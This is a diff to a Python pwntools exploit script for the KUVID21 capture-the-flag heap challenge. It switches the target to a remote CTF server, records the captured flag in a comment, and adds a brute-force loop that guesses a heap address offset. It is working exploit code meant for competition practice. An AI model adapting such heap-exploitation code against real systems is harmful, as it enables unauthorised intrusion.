@@ -6,6 +6,8 @@ import time
 
 pwn.context.log_level = 'error'
 
+#cd21{m1t1g4t10ns_4r3_n0_us3_4g41nst_m3}
+
 infectCount = 0
 def infect(conn, first, last, allergies):
     global infectCount
@@ -31,7 +33,8 @@ def cure(conn, i):
     res = conn.recvline().decode('ascii')
     print(f'cure {i}: {res}')
     if 'cd21{' in res:
-        raise Exception('got ya')
+        sys.exit()
+       
 
     line = conn.recvuntil('Alright').decode('ascii')
     if 'This chunk is not infected with KUPAC virus. Thank the ALLOCATOR!' in line:
@@ -331,13 +334,13 @@ def crash2():
     print(r)
 
   
-def solve():
+def solve(to_be_guessed):
     global infectCount
 
-    #conn = pwn.remote('challenges.crysys.hu', 5009)
-    conn = pwn.process('./KUVID21')
+    conn = pwn.remote('challenges.crysys.hu', 5009)
+    #conn = pwn.process('./KUVID21')
 
-    time.sleep(5*7+ 1)
+    time.sleep(5*7)
     
     r = infect(conn, b'x'*7, b'w'*7, f'e' * 0x22)
     print(r)
@@ -378,7 +381,6 @@ def solve():
     address_bytes = [int(byte, 16) for byte in r.split(' ')]
 
     address = int.from_bytes(address_bytes,'little') 
-    to_be_guessed = 0xe0
     address += to_be_guessed + 0x10
 
     address_bytes = address.to_bytes(8, 'little') 
@@ -423,10 +425,38 @@ def solve():
     print(r)
     r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
     print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
+    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
+    print(r)
   
     cure(conn, 26)
+    sys.exit(0)
 
 
 
-
-solve()    
+while True:
+    try:
+        to_be_guessed = random.choice([
+            0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70,
+            0x80, 0x90, 0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0]
+        )
+        # to_be_guessed = 0x40
+        print(f'------------ {hex(to_be_guessed)} ------------')
+        solve(to_be_guessed)   
+    except Exception:
+        pass
